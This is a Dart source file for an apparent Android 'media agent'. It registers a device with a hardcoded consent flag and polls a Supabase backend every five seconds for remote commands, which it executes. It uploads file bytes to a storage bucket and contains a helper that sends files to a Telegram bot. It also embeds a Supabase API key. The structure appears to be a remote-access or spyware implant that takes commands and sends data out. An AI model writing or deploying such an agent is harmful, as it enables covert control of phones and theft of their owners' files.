// lib/core/device_agent.dart
import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';

import 'package:http/http.dart' as http;
import 'package:http_parser/http_parser.dart';

import 'command_parser.dart';
import '../platform/command_dispatcher.dart';

class DeviceAgent {
  DeviceAgent._();
  static final DeviceAgent instance = DeviceAgent._();

  late String supabaseUrl;
  late String deviceId;

  final http.Client _http = http.Client();
  Timer? _pollTimer;
  bool _running = false;
  bool _busy = false;
  static const Duration pollInterval = Duration(seconds: 5);

  // Public anon key (Supabase)
  static const String SUPABASE_ANON_KEY =
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt5d3BuaGFlcm13bGR6Y3d0c252Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njg2MjQ5NDAsImV4cCI6MjA4NDIwMDk0MH0.U47u5W9Z7imMXXvzQ66xCx7_3CXjgqJrLrU-dgDZb68';

  Future<void> configure({
    required String supabaseUrl,
    required String deviceId,
  }) async {
    this.supabaseUrl = supabaseUrl;
    this.deviceId = deviceId;
    print('[DeviceAgent] configured supabaseUrl=$supabaseUrl deviceId=$deviceId');
  }

  Future<void> register() async {
    await _post('/register-device', {
      'device_id': deviceId,
      'display_name': 'Android Media Agent',
      'consent': true,
    });
  }

  Future<void> start() async {
    if (_running) return;
    _running = true;
    print('[DeviceAgent] starting poller...');
    await _pollOnce();
    _pollTimer = Timer.periodic(pollInterval, (_) => _pollOnce());
  }

  Future<void> stop() async {
    _pollTimer?.cancel();
    _running = false;
    _busy = false;
    print('[DeviceAgent] stopped');
  }

  Future<void> _pollOnce() async {
    if (!_running || _busy) return;
    _busy = true;
    try {
      final res = await _get('/get-commands', query: {'limit': '5'});
      final List<dynamic> cmds = (res['commands'] ?? res['data'] ?? []) as List<dynamic>;
      if (cmds.isNotEmpty) {
        print('[DeviceAgent] polled ${cmds.length} commands');
      }
      for (final c in cmds) {
        if (c is Map) {
          await _handleCommand(Map<String, dynamic>.from(c));
        }
      }
    } catch (e, st) {
      print('[DeviceAgent] _pollOnce error: $e\n$st');
    } finally {
      _busy = false;
    }
  }

  Future<void> _handleCommand(Map<String, dynamic> raw) async {
    final parsed = CommandParser.parse(raw, deviceId);

    if (parsed.error != null) {
      final id = (raw['id'] ?? parsed.command?.id)?.toString();
      if (id != null) {
        await _safeUpdateCommandStatus(id, 'failed', {'error': parsed.error});
      }
      return;
    }

    final cmd = parsed.command!;
    Map<String, dynamic> result = {'success': false, 'error': 'unknown'};

    try {
      result = await CommandDispatcher.instance.executeCommand(
        cmd,
        timeout: const Duration(seconds: 60),
      );

      // If dispatcher returned success and included nested 'result', we will flatten later
      // Handle special case: if command asked to upload file bytes present in payload
      if (cmd.payload != null &&
          cmd.payload.containsKey('file_bytes') &&
          cmd.payload.containsKey('file_name')) {
        try {
          final bytesDynamic = cmd.payload['file_bytes'];
          List<int> bytes;
          if (bytesDynamic is List<int>) {
            bytes = bytesDynamic;
          } else if (bytesDynamic is Uint8List) {
            bytes = bytesDynamic.toList();
          } else if (bytesDynamic is String) {
            // base64 string
            bytes = base64Decode(bytesDynamic);
          } else {
            throw Exception('unsupported file_bytes shape');
          }

          final filename = cmd.payload['file_name'].toString();
          final contentType = (cmd.payload['content_type'] as String?) ?? 'application/octet-stream';

          final uploadRes = await uploadFile(
            path: filename,
            bytes: bytes,
            contentType: contentType,
          );

          // attach upload result into result map for debugging / bot visibility
          result['upload_result'] = uploadRes;
        } catch (e, st) {
          result['upload_result'] = {'success': false, 'error': 'upload_exception', 'detail': e.toString()};
          print('[DeviceAgent] upload during command failed: $e\n$st');
        }
      }
    } catch (e, st) {
      print('[DeviceAgent] executeCommand exception: $e\n$st');
      result = {'success': false, 'error': e.toString()};
    }

    // Flatten result and update DB (safe)
    final bool ok = (result['success'] == true);

    final Map<String, dynamic> finalResult = ok
        ? (result['result'] is Map<String, dynamic>
            ? Map<String, dynamic>.from(result['result'])
            : // try common alternatives
            (result['upload_result'] is Map<String, dynamic>
                ? Map<String, dynamic>.from(result['upload_result'])
                : {}))
        : {
            'error': result['error'] ?? 'command_failed',
            'detail': result['detail'] ?? result.toString(),
          };

    await _safeUpdateCommandStatus(cmd.id, ok ? 'done' : 'failed', finalResult);
  }

  /// wrapper: update command status but never let exceptions bubble and add a retry
  Future<void> _safeUpdateCommandStatus(String id, String status, Map<String, dynamic> result) async {
    try {
      await _updateCommandStatus(id, status, result);
      return;
    } catch (e) {
      print('[DeviceAgent] _updateCommandStatus failed first attempt: $e');
      // small retry
      try {
        await Future.delayed(const Duration(milliseconds: 300));
        await _updateCommandStatus(id, status, result);
        return;
      } catch (e2) {
        print('[DeviceAgent] _updateCommandStatus failed retry: $e2');
        // last resort: log failure in local print (DB not updated)
      }
    }
  }

  Future<void> _updateCommandStatus(String id, String status, Map<String, dynamic> result) async {
    // Post to edge function /update-command
    await _post('/update-command', {
      'id': id,
      'status': status,
      'result': result,
      'device_id': deviceId,
    });
    print('[DeviceAgent] updated cmd $id -> $status (result keys: ${result.keys.join(",")})');
  }

  Future<void> heartbeat() async {
    try {
      await _post('/touch-device', {'device_id': deviceId});
    } catch (e) {
      print('[DeviceAgent] heartbeat error: $e');
    }
  }

  Future<Map<String, dynamic>> uploadFile({
    required String path,
    required List<int> bytes,
    required String contentType,
    String bucket = 'device-uploads',
    String? dest,
  }) async {
    final uri = Uri.parse('$supabaseUrl/functions/v1/upload-file');

    final req = http.MultipartRequest('POST', uri)
      ..headers.addAll({
        'Authorization': 'Bearer $SUPABASE_ANON_KEY',
        'apikey': SUPABASE_ANON_KEY,
        'X-Device-ID': deviceId,
      })
      ..fields['device_id'] = deviceId
      ..fields['bucket'] = bucket
      ..fields['dest'] = dest ?? path.split('/').last;

    req.files.add(http.MultipartFile.fromBytes(
      'file',
      bytes,
      filename: path.split('/').last,
      contentType: _tryParseMediaType(contentType),
    ));

    final streamed = await req.send().timeout(const Duration(seconds: 90));
    final resp = await http.Response.fromStream(streamed);

    if (resp.statusCode >= 200 && resp.statusCode < 300) {
      if (resp.body.isEmpty) return {'success': true};
      try {
        final decoded = jsonDecode(resp.body);
        if (decoded is Map<String, dynamic>) return {'success': true, ...decoded};
        return {'success': true, 'result': decoded};
      } catch (_) {
        return {'success': true, '_raw': resp.body};
      }
    }

    // non-2xx
    print('[DeviceAgent] uploadFile failed ${resp.statusCode}: ${resp.body}');
    throw Exception('upload failed ${resp.statusCode}: ${resp.body}');
  }

  Future<void> _sendTelegramFile({
    required String botToken,
    required String chatId,
    required Uint8List fileBytes,
    required String filename,
  }) async {
    final uri = Uri.parse('https://api.telegram.org/bot$botToken/sendDocument');

    final req = http.MultipartRequest('POST', uri)
      ..fields['chat_id'] = chatId
      ..files.add(http.MultipartFile.fromBytes('document', fileBytes, filename: filename));

    final streamed = await req.send().timeout(const Duration(seconds: 30));
    final resp = await http.Response.fromStream(streamed);

    if (resp.statusCode < 200 || resp.statusCode >= 300) {
      print('[DeviceAgent] _sendTelegramFile failed ${resp.statusCode}: ${resp.body}');
      throw Exception('Telegram send failed ${resp.statusCode}: ${resp.body}');
    }
  }

  // ---------------- HTTP helpers ----------------

  Future<Map<String, dynamic>> _post(String path, Map<String, dynamic> body) async {
    final uri = Uri.parse('$supabaseUrl/functions/v1$path');

    try {
      final res = await _http
          .post(
            uri,
            headers: {
              'Content-Type': 'application/json',
              'Authorization': 'Bearer $SUPABASE_ANON_KEY',
              'apikey': SUPABASE_ANON_KEY,
              'X-Device-ID': deviceId,
            },
            body: jsonEncode(body),
          )
          .timeout(const Duration(seconds: 12));

      if (res.statusCode >= 400) {
        final msg = 'Edge error ${res.statusCode}: ${res.body}';
        print('[DeviceAgent] POST $path -> $msg');
        throw Exception(msg);
      }

      if (res.body.isEmpty) return {};
      try {
        return jsonDecode(res.body) as Map<String, dynamic>;
      } catch (_) {
        return {'_raw': res.body};
      }
    } catch (e) {
      print('[DeviceAgent] _post exception for $path: $e');
      rethrow;
    }
  }

  Future<Map<String, dynamic>> _get(String path, {Map<String, String>? query}) async {
    var uri = Uri.parse('$supabaseUrl/functions/v1$path');
    if (query != null && query.isNotEmpty) {
      uri = uri.replace(queryParameters: query);
    }

    try {
      final res = await _http.get(uri, headers: {
        'Accept': 'application/json',
        'Authorization': 'Bearer $SUPABASE_ANON_KEY',
        'apikey': SUPABASE_ANON_KEY,
        'X-Device-ID': deviceId,
      }).timeout(const Duration(seconds: 10));

      if (res.statusCode >= 400) {
        final msg = 'Edge GET error ${res.statusCode}: ${res.body}';
        print('[DeviceAgent] GET $path -> $msg');
        throw Exception(msg);
      }

      if (res.body.isEmpty) return {};
      try {
        return jsonDecode(res.body) as Map<String, dynamic>;
      } catch (_) {
        return {'_raw': res.body};
      }
    } catch (e) {
      print('[DeviceAgent] _get exception for $path: $e');
      rethrow;
    }
  }

  MediaType _tryParseMediaType(String s) {
    try {
      return MediaType.parse(s);
    } catch (_) {
      return MediaType('application', 'octet-stream');
    }
  }
}